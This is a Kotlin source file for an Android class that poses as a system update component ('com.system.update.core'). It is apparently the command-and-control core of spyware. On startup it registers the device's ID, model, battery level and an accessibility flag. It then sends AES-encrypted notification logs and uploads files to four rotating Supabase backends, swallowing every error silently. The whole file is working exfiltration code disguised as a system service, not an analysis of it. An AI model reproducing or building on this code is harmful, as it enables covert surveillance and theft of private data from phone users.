package com.system.update.core

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import android.util.Base64
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.net.HttpURLConnection
import java.net.URL
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class NetworkConnectionManager(private val context: Context) {

    private val nodeKeys = listOf("A", "B", "C", "D")
    private var currentNodeIndex = 0
    private val random = SecureRandom()
    private val deviceKey: ByteArray

    init {
        val androidId = getDeviceId()
        deviceKey = MessageDigest.getInstance("SHA-256").digest(androidId.toByteArray())
        registerDevice()
    }

    private fun registerDevice() {
        val deviceData = JSONObject().apply {
            put("client_serial", getDeviceId())
            put("model_name", "${Build.MANUFACTURER} ${Build.MODEL}")
            put("android_version", Build.VERSION.RELEASE)
            put("battery_level", getBatteryLevel())
            put("is_accessibility_enabled", true)
            put("auth_token", SecureEnv.masterPass)
        }
        sync(deviceData.toString(), "client_info")
    }

    fun sync(payload: String, type: String = "notification_logs") {
        Thread {
            try {
                val data = JSONObject().apply {
                    put("device_id", getDeviceId())
                    put("type", type)
                    put("payload", if (payload.startsWith("{")) JSONObject(payload) else payload)
                }
                val encryptedPayload = encrypt(data.toString().toByteArray())
                executeRequest("functions/v1/sync-handler", encryptedPayload, "application/octet-stream")
            } catch (e: Exception) { }
        }.start()
    }

    fun uploadFile(file: File, bucketName: String, remotePath: String) {
        if (!file.exists()) return
        Thread {
            val endpoint = "storage/v1/object/$bucketName/$remotePath"
            executeStreamingUpload(endpoint, file)
        }.start()
    }

    private fun executeStreamingUpload(endpoint: String, file: File) {
        if (!checkConnectivity()) return
        var attempts = 0
        while (attempts < nodeKeys.size) {
            val key = nodeKeys[currentNodeIndex]
            val baseUrl = SecureEnv.supabaseUrls[key]
            val apiKey = SecureEnv.supabaseKeys[key]

            if (baseUrl.isNullOrEmpty() || apiKey.isNullOrEmpty()) {
                switchNode()
                attempts++
                continue
            }

            var connection: HttpURLConnection? = null
            try {
                val url = URL("${baseUrl.trimEnd('/')}/$endpoint")
                connection = url.openConnection() as HttpURLConnection
                connection.apply {
                    requestMethod = "POST"
                    doOutput = true
                    setFixedLengthStreamingMode(file.length())
                    connectTimeout = 30000
                    setRequestProperty("apikey", apiKey)
                    setRequestProperty("Authorization", "Bearer $apiKey")
                    setRequestProperty("Content-Type", "application/octet-stream")
                    setRequestProperty("X-Device-ID", getDeviceId())
                }
                FileInputStream(file).use { input ->
                    connection.outputStream.use { output ->
                        val buffer = ByteArray(8192)
                        var bytesRead: Int
                        while (input.read(buffer).also { bytesRead = it } != -1) {
                            output.write(buffer, 0, bytesRead)
                        }
                    }
                }
                if (connection.responseCode in 200..299) return
                else switchNode()
            } catch (e: Exception) {
                switchNode()
            } finally {
                connection?.disconnect()
            }
            attempts++
        }
    }

    private fun executeRequest(endpoint: String, body: ByteArray, contentType: String) {
        if (!checkConnectivity()) return
        var attempts = 0
        while (attempts < nodeKeys.size) {
            val key = nodeKeys[currentNodeIndex]
            val baseUrl = SecureEnv.supabaseUrls[key]
            val apiKey = SecureEnv.supabaseKeys[key]

            if (baseUrl.isNullOrEmpty() || apiKey.isNullOrEmpty()) {
                switchNode()
                attempts++
                continue
            }

            var connection: HttpURLConnection? = null
            try {
                val url = URL("${baseUrl.trimEnd('/')}/$endpoint")
                connection = url.openConnection() as HttpURLConnection
                connection.apply {
                    requestMethod = "POST"
                    doOutput = true
                    connectTimeout = 15000
                    setRequestProperty("apikey", apiKey)
                    setRequestProperty("Authorization", "Bearer $apiKey")
                    setRequestProperty("Content-Type", contentType)
                    setRequestProperty("X-Device-ID", getDeviceId())
                    outputStream.use { it.write(body) }
                }
                if (connection.responseCode in 200..299) return
                else switchNode()
            } catch (e: Exception) {
                switchNode()
            } finally {
                connection?.disconnect()
            }
            attempts++
        }
    }

    fun checkConnectivity(): Boolean {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val capabilities = cm.getNetworkCapabilities(cm.activeNetwork)
        return capabilities?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) ?: false
    }

    private fun switchNode() {
        currentNodeIndex = (currentNodeIndex + 1) % nodeKeys.size
    }

    fun getDeviceId(): String = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"

    private fun getBatteryLevel(): Int {
        val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            context.registerReceiver(null, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            context.registerReceiver(null, filter)
        }
        return batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
    }

    fun encrypt(data: ByteArray): ByteArray {
        val iv = ByteArray(12).also { random.nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(deviceKey, "AES"), GCMParameterSpec(128, iv))
        return iv + cipher.doFinal(data)
    }
}
